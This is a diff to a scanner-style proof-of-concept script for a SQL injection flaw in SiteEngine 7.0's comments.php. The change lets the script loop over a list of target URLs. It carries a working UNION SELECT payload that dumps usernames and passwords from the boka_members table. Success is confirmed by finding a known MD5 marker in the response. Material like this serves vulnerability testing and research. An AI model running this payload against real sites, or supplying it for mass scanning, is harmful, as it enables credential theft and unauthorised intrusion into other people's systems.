@@ -1,13 +1,23 @@
-#request url = var
+#request urls = array
 #define payload = /comments.php?id=1&module=newstopic+m,boka_newstopicclass+c+WhEre+1=2+UniOn+sElEct+1,2,Group_Concat(username, 0x7e, password, Md5(1234), 0x7e),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39+From+boka_members%23
 #define bug = 81dc9bdb52d04dc20036dbd8313ed055
 #define info = 存在SiteEngine7.0 comments.php SQL注入漏洞
 
 function main(args)
 {
-	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
-	if(StrFindStr(res[0],bug,0)!= "-1")
-	{
-		print(url.info);
+	printclolor("当前正在检测:".info,1);
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		url = urls[i];
+		try{
+			res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+			if(StrFindStr(res[0],bug,0)!= "-1")
+			{
+				printclolor("[+]".urls[i].info,3);
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
 	}
 }
